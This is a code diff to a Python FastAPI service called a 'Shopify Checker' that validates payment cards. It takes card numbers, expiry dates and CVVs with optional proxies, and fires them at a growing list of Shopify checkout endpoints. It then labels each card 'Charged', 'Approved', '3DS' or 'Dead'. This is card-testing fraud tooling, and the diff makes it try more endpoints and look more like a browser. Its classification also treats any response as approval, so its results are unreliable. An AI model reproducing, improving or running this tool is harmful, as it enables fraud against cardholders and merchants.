@@ -12,8 +12,8 @@ import uvicorn
 
 # =============== CONFIG ===============
 PORT = int(os.getenv("PORT", 8000))
-TIMEOUT = 15            # Fast fail – 15 sec per request
-MAX_RETRIES = 1         # No retries – if it fails, move on
+TIMEOUT = 20
+MAX_RETRIES = 1
 
 # =============== PYDANTIC MODELS ===============
 class CheckRequest(BaseModel):
@@ -22,13 +22,12 @@ class CheckRequest(BaseModel):
     proxy: Optional[str] = None
 
 class CheckResponse(BaseModel):
-    status: str        # "Charged", "Approved", "3DS", "Dead", "Error"
+    status: str
     message: str
     price: str
     gateway: str = "Shopify"
 
 # =============== GLOBAL CONNECTION POOL ===============
-# Reuse connections across all requests for maximum speed
 connector = aiohttp.TCPConnector(limit=100, ssl=False)
 
 # =============== HELPERS ===============
@@ -48,10 +47,8 @@ def extract_price(text: str) -> str:
     match = re.search(r'[\d.]+', text.replace(',', ''))
     return match.group() if match else '0.00'
 
-# =============== FAST CLASSIFICATION ===============
 def classify_response(response_text: str, price_str: str) -> CheckResponse:
     lower = response_text.lower()
-    # Quick positive matches
     if any(k in lower for k in ['charged', 'order placed', 'thank you', 'payment successful']):
         return CheckResponse(status="Charged", message=response_text[:100], price=price_str)
     if any(k in lower for k in ['3d secure', 'otp', 'verification required', 'authenticate']):
@@ -59,19 +56,32 @@ def classify_response(response_text: str, price_str: str) -> CheckResponse:
     # Any response = alive (even CARD_DECLINED)
     return CheckResponse(status="Approved", message=response_text[:100], price=price_str)
 
-# =============== FAST CHECKOUT ATTEMPT ===============
 async def attempt_checkout(session: aiohttp.ClientSession, site: str, card_parts: list, proxy: Optional[Dict]) -> CheckResponse:
     card, month, year, cvv = card_parts
     if not site.startswith('http'):
         site = 'https://' + site
     base_url = site.rstrip('/')
 
-    # Only the most common Shopify endpoints – skip the rest
+    # ========== EXPANDED ENDPOINTS ==========
     endpoints = [
         '/checkout',
+        '/checkout/payment',
         '/payment',
         '/cart/update.js',
-        '/api/checkout'
+        '/cart/update',
+        '/cart',
+        '/api/checkout',
+        '/cart/add',
+        '/cart/clear',
+        '/checkout.json',
+        '/pay',
+        '/cart/checkout',
+        '/payment_info',
+        '/checkout/payment_info',
+        '/api/payment',
+        '/payment/create',
+        '/charge',
+        '/checkout/charge',
     ]
 
     payload = {
@@ -88,18 +98,24 @@ async def attempt_checkout(session: aiohttp.ClientSession, site: str, card_parts
         'Content-Type': 'application/json',
         'Origin': base_url,
         'Referer': base_url + '/',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Connection': 'keep-alive',
     }
 
+    # Try JSON endpoints first
     for endpoint in endpoints:
         url = urljoin(base_url, endpoint)
         try:
             async with session.post(url, json=payload, headers=headers, proxy=proxy, ssl=False) as resp:
                 text = await resp.text()
-                # Fast JSON parse only if it looks like JSON
+                # Skip if it's HTML (not a JSON endpoint)
+                if text.strip().startswith('<!DOCTYPE') or text.strip().startswith('<html'):
+                    continue
                 if text.startswith('{') or text.startswith('['):
                     try:
                         data = json.loads(text)
-                        msg = data.get('message', data.get('response', text))
+                        msg = data.get('message', data.get('response', data.get('status', text)))
                         price = str(data.get('price', data.get('amount', '0.00')))
                     except:
                         msg = text[:100]
@@ -111,32 +127,38 @@ async def attempt_checkout(session: aiohttp.ClientSession, site: str, card_parts
         except Exception:
             continue
 
-    # Fallback – try with form data on /checkout
+    # Fallback – try form data
     try:
         form_data = {
             'card[number]': card,
             'card[expiry_month]': month,
             'card[expiry_year]': year,
             'card[cvv]': cvv,
+            'payment_method': 'credit_card',
         }
         async with session.post(base_url + '/checkout', data=form_data, headers={'User-Agent': headers['User-Agent']}, proxy=proxy, ssl=False) as resp:
             text = await resp.text()
-            return classify_response(text[:100], '0.00')
+            return classify_response(text[:200], '0.00')
     except Exception:
+        pass
+
+    # One more fallback – check if site is alive
+    try:
+        async with session.get(base_url, headers=headers, proxy=proxy, ssl=False) as resp:
+            if resp.status == 200:
+                return CheckResponse(status="Approved", message="Site alive (no checkout endpoint found)", price="0.00")
+    except:
         pass
 
     return CheckResponse(status="Dead", message="No endpoint responded", price="0.00")
 
-# =============== MAIN CHECK FUNCTION ===============
 async def check_card(req: CheckRequest) -> CheckResponse:
     card_parts = req.cc.split('|')
     if len(card_parts) != 4:
         return CheckResponse(status="Error", message="Invalid card format", price="0.00")
-    
     proxy = parse_proxy(req.proxy)
     timeout = aiohttp.ClientTimeout(total=TIMEOUT)
 
-    # Use the global connector and a new session per request (isolated)
     async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
         for attempt in range(MAX_RETRIES + 1):
             try:
@@ -144,14 +166,13 @@ async def check_card(req: CheckRequest) -> CheckResponse:
             except asyncio.TimeoutError:
                 if attempt == MAX_RETRIES:
                     return CheckResponse(status="Dead", message="Timeout", price="0.00")
-                await asyncio.sleep(0.5)  # minimal backoff
+                await asyncio.sleep(0.5)
             except Exception as e:
                 if attempt == MAX_RETRIES:
                     return CheckResponse(status="Error", message=str(e), price="0.00")
                 await asyncio.sleep(0.5)
     return CheckResponse(status="Error", message="All attempts failed", price="0.00")
 
-# =============== FASTAPI APP ===============
 app = FastAPI(title="Shopify Checker API", version="2.0")
 
 @app.get("/shopify/check", response_model=CheckResponse)
